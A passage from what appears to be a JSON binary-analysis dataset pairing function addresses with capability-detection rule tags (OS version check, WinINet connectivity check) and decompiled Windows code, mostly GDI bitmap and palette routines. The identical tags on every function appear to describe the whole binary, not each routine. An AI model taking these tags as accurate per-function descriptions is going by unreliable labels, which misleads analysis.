        "decompiled_code": "\nint32_t * __fastcall fcn.00428b88(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00426460();\n    in_EAX[0xd] = 0x20000000;\n    iVar1 = fcn.00404610();\n    in_EAX[10] = iVar1;\n    fcn.004280e0();\n    if (*0x490b94 != '\\0') {\n        (**(*in_EAX + 0x70))();\n    }\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 216
    },
    "00428e8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428e8c(int32_t *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_2ch;\n    int32_t arg_28h;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_dh;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = in_EAX[10];\n    uStack48 = 0x428eae;\n    var_4h = param_2;\n    fcn.00424f9c();\n    uStack48 = 0x428eb5;\n    fcn.00429508();\n    var_8h = 0;\n    var_9h = 0;\n    iVar3 = *(iVar6 + 0x10);\n    if (iVar3 != 0) {\n        uStack48 = 0xffffffff;\n        uStack56 = *(var_4h + 4);\n        uStack60 = 0x428ed4;\n        iStack52 = iVar3;\n        var_8h = sub.gdi32.dll_SelectPalette();\n        uStack60 = *(var_4h + 4);\n        uStack64 = 0x428ee3;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack64 = 0xc;\n    uStack68 = *(var_4h + 4);\n    uStack72 = 0x428ef5;\n    var_9h = iVar3 != 0;\n    uStack72 = sub.gdi32.dll_GetDeviceCaps();\n    uStack76 = 0xe;\n    puStack80 = *(var_4h + 4);\n    uStack84 = 0x428f04;\n    iVar3 = sub.gdi32.dll_GetDeviceCaps();\n    if ((puStack80 * iVar3 < 9) && (puStack80 * iVar3 < *(iVar6 + 0x2a) * *(iVar6 + 0x28))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    if (bVar1) {\n        puStack80 = &fcn.00428e8c::var_11h;\n        uStack84 = *(var_4h + 4);\n        puStack88 = 0x428f37;\n        sub.gdi32.dll_GetBrushOrgEx();\n        puStack88 = 0x4;\n        uStack92 = *(var_4h + 4);\n        puStack96 = 0x428f45;\n        sub.gdi32.dll_SetStretchBltMode();\n        puStack96 = &fcn.00428e8c::var_11h;\n        puStack100 = var_dh;\n        uStack104 = var_11h;\n        uStack108 = *(var_4h + 4);\n        sub.gdi32.dll_SetBrushOrgEx();\n    }\n    else {\n        puStack80 = 0x428f66;\n        cVar2 = fcn.00429218();\n        if (cVar2 == '\\0') {\n            puStack80 = 0x3;\n            uStack84 = 0x428f74;\n            uStack84 = fcn.00424ec0();\n            puStack88 = 0x428f7a;\n            sub.gdi32.dll_SetStretchBltMode();\n        }\n    }\n    uStack92 = 0x4290ca;\n    puStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puStack100 = 0x428f8f;\n    puStack88 = &stack0xfffffffc;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        puStack100 = 0x428f9a;\n        fcn.004294a8();\n    }\n    puStack100 = 0x428fa1;\n    fcn.0042915c();\n    puStack100 = 0x428fad;\n    fcn.00424f9c();\n    puStack100 = 0x428fb4;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        uStack104 = 0x42905f;\n        uStack108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStack100 = &stack0xfffffffc;\n        sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar3 = fcn.004252c4();\n        iVar4 = sub.gdi32.dll_SelectObject(iVar3, *(iVar6 + 0xc));\n        arg_2ch = param_1[2] - *param_1;\n        arg_28h = param_1[3] - param_1[1];\n        iVar5 = fcn.0042915c();\n        uVar7 = 0;\n        fcn.00425474(0, 0, iVar3, *(iVar6 + 0x20), *(iVar6 + 0x1c), 0, 0, *(iVar5 + 4), arg_28h, arg_2ch);\n        *in_FS_OFFSET = uVar7;\n        if (iVar4 != 0) {\n            sub.gdi32.dll_SelectObject(iVar3, iVar4, 0x4290a4);\n        }\n        if (iVar3 != 0) {\n            sub.gdi32.dll_DeleteDC(iVar3);\n        }\n        return;\n    }\n    puStack100 = *(var_4h + 0x20);\n    uStack104 = *(iVar6 + 0x20);\n    uStack108 = *(iVar6 + 0x1c);\n    iVar6 = fcn.0042915c(0, 0);\n    uVar7 = *(var_4h + 4);\n    sub.gdi32.dll_StretchBlt(uVar7, *param_1, param_1[1], param_1[2] - *param_1, param_1[3] - param_1[1], *(iVar6 + 4));\n    *in_FS_OFFSET = uVar7;\n    if (var_9h != '\\0') {\n        sub.gdi32.dll_SelectPalette(*(var_4h + 4), var_8h, 0xffffffff, 0x4290d1);\n    }\n    return;\n}\n",
        "token_count": 1580
    },
    "004290dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004290dc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (1 < *(iVar1 + 4)) {\n        fcn.00429408();\n        fcn.00428d28(iVar1 + 0x18);\n        return;\n    }\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 8) != *(iVar1 + 0x14))) {\n        if ((*(iVar1 + 0x14) != 0) && (iVar2 = sub.gdi32.dll_DeleteObject(*(iVar1 + 0x14)),  iVar2 == 0)) {\n            fcn.0042521c();\n        }\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x2c) = 0;\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "0042915c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0042915c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0xb] == 0) {\n        fcn.00429408();\n        if (in_EAX[0xb] == 0) {\n            iVar1 = fcn.00427eec();\n            in_EAX[0xb] = iVar1;\n            *(iVar1 + 0x2c) = in_EAX;\n            *(iVar1 + 0x28) = *(*in_EAX + 0x10);\n            *(iVar1 + 0x34) = in_EAX;\n            *(iVar1 + 0x30) = fcn.00428de8;\n        }\n    }\n    return in_EAX[0xb];\n}\n",
        "token_count": 177
    },
    "004291c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004291c8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    unkbyte3 Var3;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    Var3 = iVar1 >> 8;\n    if ((*(iVar1 + 8) == 0) || (*(iVar1 + 8) == *(iVar1 + 0x14))) {\n        if (*(iVar1 + 0x14) != 0) {\n            return 0;\n        }\n        if (*(iVar1 + 0x30) == 0) {\n            uVar2 = CONCAT31(Var3, 1);\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = CONCAT31(Var3, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 194
    },
    "00429384": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429384(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 0x14) == 0)) {\n        fcn.00429508();\n        if (*(iVar1 + 0x30) == 0) {\n            sub.gdi32.dll_GetObjectA(*(iVar1 + 8), 0x54, iVar1 + 0x18);\n            *(iVar1 + 0x30) = 0x28;\n            *(iVar1 + 0x34) = *(iVar1 + 0x1c);\n            *(iVar1 + 0x38) = *(iVar1 + 0x20);\n            *(iVar1 + 0x3c) = 1;\n            *(iVar1 + 0x3e) = *(iVar1 + 0x28) * *(iVar1 + 0x2a);\n        }\n        uVar2 = fcn.004282b4(0, iVar1 + 0x18);\n        *(iVar1 + 0x14) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "00429408": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429408(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (((*(iVar1 + 8) == 0) && (*(iVar1 + 0x14) == 0)) && (*(iVar1 + 0x6c) != 0)) {\n        puStackY32 = 0x429435;\n        fcn.0041b674(0, 0);\n        iVar1 = in_EAX[4];\n        iVar2 = in_EAX[5];\n        uStackY36 = 0x42948b;\n        uStackY40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        in_EAX[4] = 0;\n        in_EAX[5] = 0;\n        puStackY32 = &stack0xfffffffc;\n        (**(*in_EAX + 0x54))();\n        *in_FS_OFFSET = uStackY40;\n        in_EAX[4] = iVar1;\n        in_EAX[5] = iVar2;\n        return;\n    }\n    iVar1 = in_EAX[10];\n    if (*(iVar1 + 8) == 0) {\n        *(iVar1 + 8) = *(iVar1 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "004294a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004294a8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((*(in_EAX + 0x32) == '\\0') || (*(in_EAX + 0x31) == '\\0')) {\n        iVar1 = *(in_EAX + 0x28);\n        if (*(iVar1 + 0xc) != 0) {\n            fcn.00427e70();\n            sub.gdi32.dll_DeleteObject(*(iVar1 + 0xc));\n            *(iVar1 + 0xc) = 0;\n        }\n        fcn.004293f8();\n        fcn.00429408();\n        iVar1 = *(in_EAX + 0x28);\n        fcn.00429334();\n        uVar2 = fcn.0042897c();\n        *(iVar1 + 0xc) = uVar2;\n        *(in_EAX + 0x32) = 1;\n        *(in_EAX + 0x31) = 1;\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00429508": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429508(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char cVar6;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(in_EAX + 0x30) != '\\0') {\n        return;\n    }\n    if (*(iVar1 + 0x10) != 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == *(iVar1 + 8)) {\n        fcn.00427e70();\n    }\n    iVar2 = fcn.004259bc();\n    *(iVar1 + 0x10) = iVar2;\n    if (iVar2 != 0) {\n        return;\n    }\n    sub.user32.dll_GetDC(0);\n    uVar3 = fcn.004252c4();\n    if (*(iVar1 + 0x71) == '\\0') {\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xc);\n        iVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xe);\n        if (*(iVar1 + 0x2a) * *(iVar1 + 0x28) <= iVar2 * iVar4) {\n            cVar6 = '\\0';\n            goto code_r0x00429599;\n        }\n    }\n    cVar6 = '\\x01';\ncode_r0x00429599:\n    *(iVar1 + 0x71) = cVar6;\n    if (cVar6 != '\\0') {\n        uVar5 = sub.gdi32.dll_CreateHalftonePalette(uVar3);\n        *(iVar1 + 0x10) = uVar5;\n    }\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    if (*(iVar1 + 0x10) == 0) {\n        *(in_EAX + 0x30) = 1;\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "004295c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004295c0(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int16_t in_DX;\n    uint var_54h;\n    int32_t var_40h;\n    uint var_3ch;\n    \n    if ((in_DX != 2) || (in_ECX == 0)) {\n        fcn.0042518c();\n    }\n    fcn.004293f8();\n    fcn.00403aac();\n    sub.gdi32.dll_GetObjectA();\n    if (var_40h == 0) {\n        var_3ch = 0;\n    }\n    fcn.00428d28(&var_54h);\n    *(in_EAX[10] + 0x70) = 0;\n    iVar1 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar1 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 236
    },
    "00429668": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429668(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t iVar3;\n    uint in_EDX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x429684;\n    iVar1 = fcn.00404610();\n    puStack32 = 0x4296f0;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(iVar1 + 8) = in_EDX;\n    *(iVar1 + 0x10) = in_ECX;\n    puVar4 = iVar1 + 0x18;\n    for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *(iVar1 + 0x70) = arg_ch;\n    if (*(iVar1 + 0x2c) != 0) {\n        *(iVar1 + 0x14) = *(iVar1 + 8);\n    }\n    uStack40 = 0x4296e0;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = fcn.004047f0();\n    *(iVar1 + 0x6c) = uVar2;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x497a14;\n    puStack32 = 0x429711;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack36 = 0x429750;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.004280e4();\n    *(in_EAX + 0x28) = iVar1;\n    fcn.004280e0();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x429757;\n    uStack36 = 0x497a14;\n    uStack40 = 0x42974f;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 569
    },
    "0042a0dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042a0dc(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    int32_t var_9h;\n    int32_t *var_4h;\n    \n    uStack116 = 0x42a0f2;\n    var_4h = in_EAX;\n    uVar2 = fcn.00429248();\n    if (param_2 != uVar2) {\n        if (param_2 == 0) {\n            uStack116 = 0x42a110;\n            (**(*var_4h + 0x70))();\n        }\n        else {\n            if (param_2 != 8) {\n                uStack116 = 0x42a133;\n                fcn.00403aac();\n                iVar1 = var_4h[10];\n                puVar5 = iVar1 + 0x18;\n                puVar6 = &fcn.0042a0dc::var_5dh;\n                for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                var_9h._0_1_ = '\\0';\n                var_49h = 0;\n                var_45h = 0x28;\n                var_41h = var_59h;\n                var_3dh = var_55h;\n                var_39h._0_2_ = 1;\n                var_39h._2_2_ = *(param_2 + 0x490e2b);\n                unique0x00007a00 = *(iVar1 + 0x10);\n                if (param_2 == 2) {\n                    stack0xfffffff4 = *0x4979f8;\n                }\n                else if (param_2 == 3) {\n                    uStack116 = 0;\n                    uStack120 = 0x42a19d;\n                    sub.user32.dll_GetDC();\n                    uStack120 = 0x42a1a2;\n                    uVar3 = fcn.004252c4();\n                    uStack124 = 0x42a1aa;\n                    uStack120 = uVar3;\n                    *NULL = sub.gdi32.dll_CreateHalftonePalette();\n                    var_9h._0_1_ = '\\x01';\n                    uStack128 = 0;\n                    puStack132 = 0x42a1b9;\n                    uStack124 = uVar3;\n                    sub.user32.dll_ReleaseDC();\n                }\n                else if (param_2 == 5) {\n                    var_35h = 3;\n                    var_1dh = 0xf800;\n                    var_19h = 0x7e0;\n                    var_15h = 0x1f;\n                }\n                uStack136 = 0x42a228;\n                iStack140 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff74;\n                puVar5 = &fcn.0042a0dc::var_5dh;\n                puStack132 = &stack0xfffffffc;\n                (**(*var_4h + 0x68))();\n                fcn.00428d28(puVar5);\n                *(var_4h + 0x22) = stack0xfffffff4 != 0;\n                *in_FS_OFFSET = puVar5;\n                uStack136 = 0x42a22f;\n                if (var_9h != '\\0') {\n                    iStack140 = stack0xfffffff4;\n                    sub.gdi32.dll_DeleteObject();\n                }\n                return;\n            }\n            uStack116 = 0x42a11f;\n            fcn.0042518c();\n        }\n    }\n    return;\n}\n",
        "token_count": 1035
    },
    "0042a268": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a268(char param_1, int32_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iStackY1120;\n    uchar *puStackY1116;\n    char cVar5;\n    char cStack1080;\n    uchar auStack1054 [1038];\n    \n    fcn.00403aac();\n    puVar1 = *(*(in_EAX + 0x28) + 0x6c);\n    if (puVar1 == NULL) {\n        fcn.00429384();\n        iVar2 = *(in_EAX + 0x28);\n        if (*(iVar2 + 0x14) != 0) {\n            cVar5 = *(iVar2 + 0x50);\n            fcn.00426118(*(iVar2 + 0x50));\n            if (*(iVar2 + 0x70) != '\\0') {\n                cStack1080 = '\\f';\n                if (*(iVar2 + 0x3e) < 9) {\n                    cStack1080 = (1 << (*(iVar2 + 0x3e) & 0x1f)) * '\\x03' + '\\f';\n                }\n            }\n            fcn.00403aac(cVar5 + cStack1080 + '\\x0e');\n            fcn.0042915c();\n            fcn.00424f9c();\n            sub.gdi32.dll_SelectObject(*(*(in_EAX + 0x2c) + 4), *(iVar2 + 0x14));\n            fcn.004252c4();\n            sub.gdi32.dll_GetDIBColorTable(*(*(in_EAX + 0x2c) + 4), 0, 0x100);\n            iStackY1120 = *(*(in_EAX + 0x2c) + 4);\n            sub.gdi32.dll_SelectObject();\n            puVar3 = *(iVar2 + 0x50);\n            puStackY1116 = auStack1054;\n            if ((puVar3 != NULL) && (puVar3 < auStack1054)) {\n                puStackY1116 = puVar3;\n            }\n            if ((((*(iVar2 + 0x70) == '\\0') && (puStackY1116 == NULL)) && (*(iVar2 + 0x10) != 0)) &&\n               ((*(iVar2 + 0x71) == '\\0' && (puStackY1116 = fcn.00425a60(),  8 < *(iVar2 + 0x3e))))) {\n                iStackY1120 = iStackY1120 + puStackY1116 * 4;\n            }\n        }\n        if (param_1 != '\\0') {\n            fcn.0041b8b8();\n        }\n        if (iStackY1120 != 0) {\n            fcn.00428268();\n            if (puStackY1116 != NULL) {\n                if ((*(iVar2 + 0x50) == NULL) || (*(iVar2 + 0x50) != puStackY1116)) {\n                    *(iVar2 + 0x50) = puStackY1116;\n                }\n                if (*(iVar2 + 0x70) != '\\0') {\n                    fcn.0042573c();\n                }\n            }\n            if (*(iVar2 + 0x70) == '\\0') {\n                fcn.0041b8b8();\n                fcn.0041b8b8();\n                if ((8 < *(iVar2 + 0x3e)) && ((*(iVar2 + 0x40) & 3) != 0)) {\n                    fcn.0041b8b8();\n                }\n            }\n            else {\n                fcn.0041b8b8();\n                fcn.0041b8b8();\n            }\n            fcn.0041b8b8();\n            fcn.0041b8b8();\n        }\n    }\n    else {\n        uVar4 = (***puVar1)();\n        if (param_1 != '\\0') {\n            fcn.0041b8b8(uVar4);\n        }\n        (****(*(in_EAX + 0x28) + 0x6c))();\n        (**(*param_2 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 976
    },
    "0042a7f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a7f0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uStack32;\n    int16_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) == 0) && (*(iVar1 + 0xc) != 0)) {\n        iVar2 = 0;\n        fcn.0041b674(0, 0);\n        uStack32 = 0x42a81f;\n        fcn.0041b880();\n        if (iVar2 != 0) {\n            if (iVar2 == 1) {\n                uStack32 = 6;\n                fcn.00425d10(iVar1 + 0x10, in_EAX + 0x2c);\n            }\n            else {\n                uStack32 = 0x42a85b;\n                fcn.004251b0();\n            }\n        }\n        *(iVar1 + 8) = uStack32;\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "0042a868": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a868(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(iVar1 + 0xc) == 0) {\n        if (*(iVar1 + 8) == 0) {\n            puStack32 = 0x42a88b;\n            fcn.004251b0();\n        }\n        puStack32 = 0x42a897;\n        uVar2 = fcn.00404610();\n        uStack36 = 0x42a8f5;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.0042a7b4();\n        if (iVar3 == *0x497a10) {\n            fcn.00403aac();\n            fcn.0041b8b8();\n        }\n        else {\n            fcn.0042a7b4();\n            fcn.00426260();\n        }\n        *in_FS_OFFSET = uStack40;\n        *(iVar1 + 0xc) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 322
    },
    "0042ae80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ae80(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42ae98;\n    fcn.0042ae68();\n    uStack32 = 0x42af21;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    for (var_8h = *(in_EAX + 4); (var_8h != NULL && ((param_2 != var_8h[2] || (param_1 != var_8h[3]))));\n        var_8h = *var_8h) {\n    }\n    if (var_8h == NULL) {\n        puStack28 = &stack0xfffffffc;\n        puVar1 = fcn.00402ef0();\n        *puVar1 = *(in_EAX + 4);\n        uVar2 = fcn.0042af34();\n        puVar1[1] = uVar2;\n        puVar1[2] = param_2;\n        puVar1[3] = param_1;\n        *(in_EAX + 4) = puVar1;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42af28;\n    uStack32 = 0x42af20;\n    fcn.0042ae74();\n    return;\n}\n",
        "token_count": 370
    },
    "0042b0b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042b0b4(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x497a54 != 0) {\n        uVar1 = fcn.00423aa4();\n        fcn.00423aa4(uVar1);\n        iVar2 = fcn.0042ae80();\n        return *(iVar2 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 95
    },
    "0042b3a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
